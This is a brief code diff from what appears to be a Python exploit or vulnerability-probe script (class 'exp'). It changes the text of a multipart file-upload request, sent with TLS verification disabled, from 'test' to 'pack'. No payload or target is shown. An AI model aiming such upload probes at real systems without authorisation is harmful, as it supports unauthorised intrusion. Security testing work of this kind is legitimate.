@@ -41,7 +41,7 @@ class exp(object):
         }
         data = '--40a1f31a0ec74efaa46d53e9f4311353\r\n' \
                'Content-Disposition: form-data; name="image1"\r\n' \
-               'Content-Type: text/plain; charset=utf-8\r\n\r\ntest\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
+               'Content-Type: text/plain; charset=utf-8\r\n\r\npack\r\n--40a1f31a0ec74efaa46d53e9f4311353--\r\n'
         try:
             res = requests.post(urls, data, verify=False, headers=headers, timeout=(4, 20))
             result = res.text.strip()
